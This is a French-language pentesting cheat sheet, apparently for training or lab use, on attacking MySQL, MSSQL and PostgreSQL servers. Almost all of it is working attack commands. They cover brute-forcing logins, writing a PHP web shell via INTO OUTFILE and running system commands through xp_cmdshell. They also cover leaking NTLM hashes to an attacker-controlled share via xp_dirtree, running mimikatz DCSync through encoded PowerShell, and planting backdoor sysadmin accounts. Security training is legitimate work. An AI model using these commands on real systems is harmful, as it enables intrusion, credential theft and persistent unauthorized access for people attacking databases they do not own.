# SQL Databases (1433,3306/TCP)

Les bases de données SQL (MySQL, MSSQL, PostgreSQL) stockent et gèrent les données structurées.
## 🔍 Énumération
### Scan de base
```bash
# MySQL (3306)
sudo nmap -sV -p 3306 $IP
nmap --script=mysql-* -p 3306 $IP

# MSSQL (1433)
sudo nmap -sV -p 1433 $IP
nmap --script=ms-sql-* -p 1433 $IP

# PostgreSQL (5432)
sudo nmap -sV -p 5432 $IP
nmap --script=pgsql-* -p 5432 $IP
```
### Banner grabbing
```bash
# MySQL
nc -vn $IP 3306

# MSSQL
nc -vn $IP 1433
```
## 🔨 Exploitation
### Authentification par défaut/faible
```bash
# MySQL
mysql -h $IP -u root
mysql -h $IP -u root -p
# Essayer: root, mysql, '', password, root@123

# MSSQL
sqsh -S $IP -U sa -P ''
# Essayer: sa, '', sa123, password

# PostgreSQL
psql -h $IP -U postgres
# Essayer: postgres, '', admin, postgresql
```

### Attaque par bruteforce
```bash
# MySQL avec Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt $IP mysql

# MSSQL avec Metasploit
use auxiliary/scanner/mssql/mssql_login
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Exécution de commandes
```bash
# MySQL - Écriture de fichier (si FILE priv)
mysql -h $IP -u root -p -e "SELECT '<?php system(\$_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/shell.php'"

# MSSQL - Exécution de commandes
# Nécessite des privilèges sysadmin
sqsh -S $IP -U sa -P 'password'
1> EXEC master..xp_cmdshell 'whoami'
2> GO

# Capture de hachage NTLM via MSSQL
sqsh -S $IP -U sa -P 'password'
1> EXEC master..xp_dirtree '\\[VOTRE_IP]\share'
2> GO
```

### Extraction de données sensibles
```bash
# MySQL - Lister les bases et données
mysql -h $IP -u root -p -e "SHOW DATABASES"
mysql -h $IP -u root -p -e "USE mysql; SHOW TABLES"
mysql -h $IP -u root -p -e "SELECT User, Password FROM mysql.user"

# MSSQL - Extraire les informations sensibles
use auxiliary/admin/mssql/mssql_enum
set RHOSTS $IP
set USERNAME sa
set PASSWORD password
run
```

### Exploitation des serveurs liés (MSSQL)
```bash
# Énumérer les serveurs liés
1> SELECT srvname FROM master..sysservers
2> GO

# Exécuter des commandes via un serveur lié
1> EXECUTE('SELECT 1') AT [LINKED_SERVER]
2> GO

# Extraction de données à travers le lien
1> EXECUTE('SELECT name FROM master..sysdatabases') AT [LINKED_SERVER]
2> GO
```

## 🔐 Post-exploitation

### Impersonation (MSSQL)
```bash
# Identifier les utilisateurs pouvant être impersonnés
1> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
2> GO

# Impersonner un utilisateur (ex: sa)
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

### DCSync via MSSQL (si privilèges de domaine)
```bash
# Vérifier si l'utilisateur SQL a des privilèges de domaine
1> EXEC master..xp_cmdshell 'whoami /priv'
2> GO

# Exécuter mimikatz pour DCSync via MSSQL
1> EXEC master..xp_cmdshell 'powershell.exe -enc [ENCODED_COMMAND]'
2> GO
```

### Persistance
```bash
# MySQL - Créer un nouvel utilisateur admin
mysql -h $IP -u root -p -e "CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION"

# MSSQL - Créer un utilisateur et ajouter aux sysadmin
1> CREATE LOGIN hacker WITH PASSWORD = 'P@ssw0rd!'
2> EXEC master..sp_addsrvrolemember 'hacker', 'sysadmin'
3> GO
```

## ⚠️ Erreurs courantes & astuces
- MySQL est sensible à la casse pour les noms de tables sous Linux
- Les commandes xp_cmdshell sont souvent désactivées par défaut dans MSSQL
- L'authentification MSSQL peut être configurée pour Windows Auth uniquement
- Utilisez `WITH RESULT SETS` en MSSQL pour formater les résultats d'exécution
- Vérifiez les privilèges avec `SHOW GRANTS` (MySQL) ou `IS_SRVROLEMEMBER` (MSSQL)